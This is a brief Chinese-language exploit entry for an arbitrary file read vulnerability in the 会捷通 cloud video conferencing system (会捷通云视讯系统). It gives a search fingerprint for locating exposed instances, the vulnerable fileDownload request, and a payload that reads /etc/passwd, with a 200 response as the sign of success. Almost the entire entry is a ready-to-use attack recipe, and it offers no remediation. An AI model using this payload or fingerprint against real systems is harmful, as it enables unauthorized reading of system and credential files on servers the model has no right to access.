# 会捷通云视讯系统fileDownload存在任意文件读取漏洞

会捷通云视讯系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/him/api/rest/v1.0/node/role"`
- **请求**：`POST /fileDownload?action=downloadBackupFile  HTTP/1.1`

**Payload**
```
fullPath=%2Fetc%2Fpasswd
```
- **响应特征**：200